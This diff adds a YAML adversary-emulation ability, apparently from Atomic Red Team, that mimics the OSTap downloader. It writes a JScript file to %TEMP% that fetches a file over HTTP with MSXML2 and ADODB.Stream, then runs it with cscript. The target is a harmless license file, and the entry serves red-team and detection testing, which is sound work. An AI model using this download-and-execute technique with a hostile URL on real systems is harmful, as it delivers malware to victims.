@@ -1,0 +1,41 @@
+- id: 3f3af983-118a-4fa1-85d3-ba4daa739d80
+  name: OSTap Payload Download
+  description: Uses cscript //E:jscript to download a file
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      sh:
+        command: echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt",
+          fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream;
+          request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET',
+          url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream');
+          stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position
+          = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0);
+          > %TEMP%\OSTapGet.js; cscript //E:Jscript %TEMP%\OSTapGet.js
+        cleanup: 'del #{script_file} /F /Q >nul 2>&1'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - execution
+  - t1204.002
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      script_file:
+        description: File to execute jscript code from
+        type: path
+        default: '%TEMP%\OSTapGet.js'
+      file_url:
+        description: URL to retrieve file from
+        type: url
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    technique_created: '2020-03-11T14:49:36.954Z'
+    atomic_guid: 3f3af983-118a-4fa1-85d3-ba4daa739d80
+    import_timestamp: '2025-06-24T11:15:03.089890Z'
